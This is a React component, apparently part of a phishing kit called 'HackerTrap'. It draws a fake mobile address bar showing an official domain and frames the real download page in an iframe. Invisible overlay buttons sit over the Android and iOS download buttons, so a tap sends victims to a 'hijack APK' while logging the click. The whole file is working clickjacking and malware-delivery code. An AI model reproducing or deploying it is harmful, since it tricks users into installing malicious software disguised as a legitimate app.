"use client";

import { useRef } from "react";
import MobileBrowserBar from "./MobileBrowserBar";
import { HIJACK_APK_PATH, REAL_SITE_URL } from "@/lib/config";

async function logHit(action: string) {
  try {
    await fetch("/api/hit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action }),
    });
  } catch {
    /* silent */
  }
}

/**
 * Hacker trap — exactly what victim sees:
 * - Fake address bar shows official thsexcex.online
 * - Real THSEX download page loaded inside iframe (authentic UI)
 * - Invisible overlay on Download button → serves hijack APK
 */
export default function HackerTrap() {
  const tapped = useRef(false);

  async function stealDownload() {
    if (tapped.current) return;
    tapped.current = true;

    await logHit("trap_download_click");

    try {
      const res = await fetch("/api/proxy/downloadlink", { cache: "no-store" });
      const json = await res.json();
      const rows = Array.isArray(json.data) ? json.data : [];
      const android = rows.find((r: { type?: string }) =>
        String(r.type || "").toLowerCase().includes("android")
      );
      window.location.href = android?.url || HIJACK_APK_PATH;
    } catch {
      window.location.href = HIJACK_APK_PATH;
    }
  }

  return (
    <div className="trap-root">
      <MobileBrowserBar />

      <div className="trap-viewport">
        <iframe
          title="THSEX"
          src={REAL_SITE_URL}
          className="trap-iframe"
          tabIndex={-1}
        />

        {/* Invisible layer — intercepts tap on Android download button */}
        <button
          type="button"
          className="trap-overlay-android"
          aria-label="download"
          onClick={stealDownload}
        />
        <button
          type="button"
          className="trap-overlay-ios"
          aria-label="download-ios"
          onClick={stealDownload}
        />
      </div>
    </div>
  );
}
